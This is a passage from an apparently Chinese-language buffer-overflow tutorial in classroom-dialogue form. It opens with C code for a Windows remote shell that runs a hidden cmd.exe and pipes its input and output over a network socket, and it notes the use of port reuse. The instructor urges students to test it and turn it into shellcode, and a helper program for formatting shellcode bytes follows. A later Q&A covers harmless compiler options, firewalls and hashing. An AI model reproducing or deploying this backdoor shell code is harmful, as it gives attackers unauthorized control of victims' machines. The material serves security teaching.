    pipeattr1.lpSecurityDescriptor = 0;
    pipeattr1.bInheritHandle = true;
    CreatePipe(&hReadPipe1,&hWritePipe1,&pipeattr1,0);
    //建立匿名管道 2
    pipeattr2.nLength = 12; 
    pipeattr2.lpSecurityDescriptor = 0;
    pipeattr2.bInheritHandle = true;
    CreatePipe(&hReadPipe2,&hWritePipe2,&pipeattr2,0);
    STARTUPINFO si;
    ZeroMemory(&si,sizeof(si));
    si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = hReadPipe2;
    si.hStdOutput = si.hStdError = hWritePipe1;
    char cmdLine[] = "cmd";
    PROCESS_INFORMATION ProcessInformation;
    //建立进程 
    ret = CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
    /*
    解释一下，这段代码创建了一个 cmd.exe，把 cmd.exe 的标准输出和标准错误输出用第一个管道的写句柄替换；cmd.exe 的标准输入用第二个管道的读句柄替换。如下：
     远程主机←入←管道 1 输出←管道 1 输入←输出(cmd.exe 子进程) 
     远程主机→输出→管道 2 输入→管道 2 输出→输入(cmd.exe 子进程) 
    */
    unsigned long lBytesRead;
    while(1)
    {
        //检查管道 1，即 CMD 进程是否有输出
        ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0,0);
        if(lBytesRead)
        {
            //管道 1 有输出，读出结果发给远程客户机
            ret=ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0);
            if(!ret) break;
            ret=send(clientFD,Buff,lBytesRead,0);
            if(ret<=0) break;
        }
        else
        {
            //否则，接收远程客户机的命令
            lBytesRead=recv(clientFD,Buff,1024,0);
            if(lBytesRead<=0) break;
            //将命令写入管道 2，即传给 CMD 进程
            ret=WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0);
            if(!ret) break;
        }
    }
    WSACleanup(); 
    return 0; 
} 
```

“其实，关键就是下面这句：”

```
Setsockopt(ss, SOL_SOCKET, SO_REUSEADDR, (char *)&val, sizeof(val)) != 0 
```

“它把套接字‘ss’设为重用，这样就可重新绑定端口了。”

古风说道，“听起来很有意思和用处也！”

“嗯，这门课只懂得原理是远远不够的，实践才是关键。大家下去也亲自测试一下，并考虑提取成 ShellCode。”

“好哩！用汇编和 C 语言直接提取都没问题。”古风摩拳擦掌。

“下次课我们会继续深入讲解漏洞的发现和分析！”

“那些更是我们想知道的东东！好啊！”同学们都欢呼起来。

“今天的课就讲到这里。天气有点冷，大家多注意身体。放学！”

# 课后解惑

## 课后解惑

Q：EXE 文件里提取出来的 ShellCode 是一个字节一个字节分开的，如何更高效的自动生成“\x01\x02\x03\x04”的形式呢？

A：我们可采用替换的方式，把空格直接替换成“\x”；也可把字节粘贴在一个文件中，然后写一个程序，把每个字节加上“\x”标志后打印出来，完成规范化 ShellCode 的生成。比如下面这个程序就可读取 shellcode.txt 文本中的字符，然后生成规范的 ShellCode 数组：

```
#include<stdio.h>
int main()
{
    FILE *fp;
    fp = fopen("ww.txt", "r");
    char shellcode[5];
    int num = 0;
    printf("\"");
    while( fscanf(fp, "%s",shellcode) !=EOF )
    {
        num++;
        printf("\\x%s",shellcode);
        if(num % 16 == 0)
        {
            printf("\"\n\"");
        }
    }
    printf("\"\n");
    return 0;
} 
```

Q：我们在 C 语言提取时，要在“工程”设置中去掉“/O2”选项，“/O2”是什么意思？

A：“/O2”表示优化，达到最大化速度。

Q：能讲一下其他的常见编译选项吗？

A：我们结合具体的设置来讲吧！Release 版下的设置如图 6－27。

在它的设置选项中，包括`/nologo /ML /W3 /GX /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_MBCS" /Fp"Release/GetShellCodeByC.pch" /YX /Fo"Release/" /Fd"Release/" /FD /c`

每一项的具体解释如下：

```
/ML：与 LIBC.LIB 链接
/W3：设置警告等级，这里是 3
/GX[-]?：启用 C++异常处理
/D{=|#}：定义宏
/D "WIN32"：定义 WIN32，表明是 WIN32 程序；
/D "NDEBUG"：没有调试信息
/D "_CONSOLE"：控制台程序
/D "_MBCS"：MBCS 字集
/Fp：命名预编译头文件
/Fp"Release/GetShellCodeByC.pch"：这里预编译头文件为 GetShellCodeByC.pch
/YX[file]：自动的.PCH 文件
/Fo：命名对象文件
/Fd[file]：命名.PDB 文件 
```

而 Debug 版的设置如图 6－28。

![](img/Q 版缓冲区溢出教程 212639.jpg)

可见选项包括：`/nologo /MLd /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_CONSOLE" /D "_MBCS" /Fp"Debug/GetShellCodeByC.pch" /YX /Fo"Debug/" /Fd"Debug/" /FD /GZ /c`

和 release 版本的差别有：

```
/MLd：与 LIBCD.LIB 调试库链接，LIBCD.LIB 是调试版本
/Gm[-]：启用最小重新生成
/ZI：启用调试信息的“编辑并继续”功能
/Od：禁用优化 
```

Q：好像有人在命令行下编程，那是如何实现的？

A：其实 VC 的本质是一个 C/C++编译器，而我们看到的界面，都是上层的东西。VC 的编译器程序是\VC98\Bin 目录下的 cl.exe，我们可在 DOS 环境下通过它来编译程序。步骤如下：先运行同目录下的 VCVARS32.bat，设置环境变量；然后就可执行 cl.exe，如 cl.exe ww.cpp ，就会生成 ww.exe。如果有必要，还可加上那些编译选项。

Q：防火墙的技术和实现原理是什么？

A：防火墙分企业级和个人防火墙两种。企业级的防火墙，实现思路要简单一点。一般的厂商都是利用公开源码的 Linux，重编译内核，加上安全选项，裁减加固，再做个用户界面，就可作为防火墙商品了。而 Windows 下的个人防火墙，反而还要麻烦一点，涉及到 HOOK 技术和底层驱动程序的开发。

Q：HASH 听起来很熟悉，有什么用处呢？

A：HASH 可用于高效查找，而且在数字签名中发挥了重要作用。